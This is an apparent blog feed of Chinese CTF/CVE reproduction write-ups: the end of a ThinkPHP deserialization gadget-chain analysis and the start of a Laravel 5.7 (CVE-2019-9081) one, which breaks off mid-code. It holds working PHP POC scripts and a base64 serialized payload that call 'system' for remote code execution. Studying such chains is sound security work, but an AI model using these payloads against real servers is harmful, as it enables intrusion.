= <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>  ······<br>  <span class="hljs-variable">$filter</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span>);<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br>           <span class="hljs-title function_ invoke__">array_walk_recursive</span>(<span class="hljs-variable">$data</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">&#x27;filterValue&#x27;</span>], <span class="hljs-variable">$filter</span>);<br>       ·······<br>&#125; <br><br></code></pre></td></tr></table></figure><p>找到<code>param()</code>函数，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">param</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>  ······<br>        <span class="hljs-comment">// 当前请求参数和URL地址中的参数合并</span><br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-literal">false</span>), <span class="hljs-variable">$vars</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-literal">false</span>));<br><br>        <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">true</span>;<br><br>·······<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$default</span>, <span class="hljs-variable">$filter</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看似完美，但是由于此时<code> $this-&gt;input($this-&gt;param, $name, $default, $filter);</code>的第二个参数会是<code>[&quot;&quot;]</code>型，在<code>input()</code>函数里前半段会因为<code>$name=(string)$name</code>报错，因此还要往上找函数</p><p>找到<code>isAjax</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAjax</span>(<span class="hljs-params"><span class="hljs-variable">$ajax</span> = <span class="hljs-literal">false</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$value</span>  = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">server</span>(<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;xmlhttprequest&#x27;</span> == <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$value</span>) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$ajax</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$result</span>           = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;var_ajax&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-variable">$result</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>十分合适，可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，从而控制<code>param()</code>的第一个参数<code>$name</code></p><p>至此整条链子分析完毕。</p><h2 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h2><p>从头复盘一下吧</p><p>起点：Window类的<code>__destruct()</code></p><p>​ 跳板<code>file_exists()</code>，利用<code>__toString()</code></p><p>跳点1:<code>trait Conversion</code>，</p><p>​跳板<code>$relation-&gt;visible([$attr]);</code>利用<code>__call()</code></p><p>跳点2:<code>think\Request</code>，</p><p>​跳板<code>call_user_func_array($this-&gt;hook[$method], $args)</code>，利用任意函数执行</p><p>跳点3:<code>think\Request</code>的 function isAjax($ajax &#x3D; false)</p><p>​跳板<code>$this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result</code>，利用<code>param()</code>，<code>$this-&gt;config</code></p><p>跳点4:<code>think\Request</code>的<code> function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)</code></p><p>​跳板<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code>，利用<code>input()</code>，<code>$this-&gt;param</code></p><p>跳点5:<code>think\Request</code>的<code>function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)</code></p><p>​跳板<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code>，利用<code> filterValue</code></p><p>终点:<code>think\Request</code>的<code>function filterValue(&amp;$value, $key, $filters)</code></p><p>​利用 <code> $value = call_user_func($filter, $value);</code>进行RCE</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Request</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$request</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;append = [<span class="hljs-string">&#x27;0.&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$request</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">hook</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = [<span class="hljs-string">&#x27;var_ajax&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;hook[<span class="hljs-string">&#x27;visible&#x27;</span>] = [<span class="hljs-variable language_">$this</span>,<span class="hljs-string">&#x27;isAjax&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-string">&#x27;system&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>\<span class="hljs-title class_">Windows</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br>&#125;<br><br><span class="hljs-comment">// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6MjoiMC4iO31zOjc6IgAqAGRhdGEiO2E6MTp7aTowO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6NztpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjA6IiI7fX19fX19</span><br><br></code></pre></td></tr></table></figure><p>![](img&#x2F;截屏2023-10-08 20.32.33.png)</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul><li>这条链子要比之前的yii2和laravel要长的多，调试起来也耗时很久。但是最终写出来、整理出来的成就感还是很不错的</li><li>通过这题也更熟练掌握了IDEA调试方式，对于pop链构造也有更好的认识</li><li>链子随长，一步一步复现出来其实也就那么回事儿～</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>unserialize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>unserialize</tag>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Laravel_5.7.* 反序列化复现</title>
    <link href="/2023/10/07/Laravel/"/>
    <url>/2023/10/07/Laravel/</url>
    
    <content type="html"><![CDATA[<p>CVE-2019-9081 复现</p><span id="more"></span><h1 id="反序列化链分析"><a href="#反序列化链分析" class="headerlink" title="反序列化链分析"></a>反序列化链分析</h1><h2 id="1-入口"><a href="#1-入口" class="headerlink" title="1. 入口"></a>1. 入口</h2><p>此反序列化漏洞入口位于 Illuminate\Foundation\Testing\PendingCommand destruct() 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;hasExecuted) &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br>     <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br> &#125;<br></code></pre></td></tr></table></figure><p>分析：<code>$this-&gt;hasExecuted</code>默认为false不执行，所以会直接执行<code>  $this-&gt;run()</code>方法，查阅<code>run()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;hasExecuted = <span class="hljs-literal">true</span>;<br><br>       <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">mockConsoleOutput</span>();<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable">$exitCode</span> = <span class="hljs-variable language_">$this</span>-&gt;app[<span class="hljs-title class_">Kernel</span>::<span class="hljs-variable language_">class</span>]-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;command, <span class="hljs-variable">$this</span>-&gt;parameters);<br>       &#125; <span class="hljs-keyword">catch</span> (NoMatchingExpectationException <span class="hljs-variable">$e</span>) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMethodName</span>() === <span class="hljs-string">&#x27;askQuestion&#x27;</span>) &#123;<br>               <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">fail</span>(<span class="hljs-string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getActualArguments</span>()[<span class="hljs-number">0</span>]-&gt;<span class="hljs-title function_ invoke__">getQuestion</span>().<span class="hljs-string">&#x27;&quot; was asked.&#x27;</span>);<br>           &#125;<br><br>           <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expectedExitCode !== <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">assertEquals</span>(<br>               <span class="hljs-variable">$this</span>-&gt;expectedExitCode, <span class="hljs-variable">$exitCode</span>,<br>               <span class="hljs-string">&quot;Expected status code <span class="hljs-subst">&#123;$this-&gt;expectedExitCode&#125;</span> but received <span class="hljs-subst">&#123;$exitCode&#125;</span>.&quot;</span><br>           );<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$exitCode</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>会先经历<code>mockConsoleOutput()</code>方法，查看该方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mockConsoleOutput</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$mock</span> = <span class="hljs-title class_">Mockery</span>::<span class="hljs-title function_ invoke__">mock</span>(<span class="hljs-title class_">OutputStyle</span>::<span class="hljs-variable language_">class</span>.<span class="hljs-string">&#x27;[askQuestion]&#x27;</span>, [<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayInput</span>(<span class="hljs-variable">$this</span>-&gt;parameters)), <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">createABufferedOutputMock</span>(),<br>    ]);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;test-&gt;expectedQuestions <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span> =&gt; <span class="hljs-variable">$question</span>) &#123;<br>        <span class="hljs-variable">$mock</span>-&gt;<span class="hljs-title function_ invoke__">shouldReceive</span>(<span class="hljs-string">&#x27;askQuestion&#x27;</span>)<br>            -&gt;<span class="hljs-title function_ invoke__">once</span>()<br>            -&gt;<span class="hljs-title function_ invoke__">ordered</span>()<br>            -&gt;<span class="hljs-title function_ invoke__">with</span>(<span class="hljs-title class_">Mockery</span>::<span class="hljs-title function_ invoke__">on</span>(function (<span class="hljs-variable">$argument</span>) <span class="hljs-keyword">use</span> (<span class="hljs-variable">$question</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$argument</span>-&gt;<span class="hljs-title function_ invoke__">getQuestion</span>() == <span class="hljs-variable">$question</span>[<span class="hljs-number">0</span>];<br>            &#125;))<br>            -&gt;<span class="hljs-title function_ invoke__">andReturnUsing</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">question</span>, $<span class="hljs-title">i</span>) &#123;<br>                <span class="hljs-title">unset</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">test</span>-&gt;<span class="hljs-title">expectedQuestions</span>[$<span class="hljs-title">i</span>]);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$question</span>[<span class="hljs-number">1</span>];<br>            &#125;);<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">bind</span>(<span class="hljs-title class_">OutputStyle</span>::<span class="hljs-variable language_">class</span>, function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">mock</span>) &#123;<br>        <span class="hljs-title">return</span> $<span class="hljs-title">mock</span>;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>大体意思就是对<code>$thie-&gt;test</code>和<code>$this-&gt;app</code>成员进行初始化</p><p>简单写个脚本调试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span>  <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>\<span class="hljs-title">Container</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<span class="hljs-comment">//这里用数组是因为原调用出会有一个foreach遍历</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里使用<code>Faker\DefaultGenerator\DefaultGenerator</code>来为<code>test</code> 和<code>app</code>赋值是因为这类的<code>__call()``__get()</code>方法都比较简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$attribute</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $method</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> array $attributes</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接报错</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310072022713.png"></p><p>问题出在这一句<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code></p><p>也就是之前我们对<code>app</code>的赋值有问题，这里会把<code>app</code>当做一个数组来执行，返回去查看app的说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The application instance.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@var</span> \Illuminate\Foundation\Application</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br></code></pre></td></tr></table></figure><p>也就是说，<code>$app</code>是<code> \Illuminate\Foundation\Application</code>的实例，修改一下Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Application</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Application</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>  <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Application</span>&#123;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-title 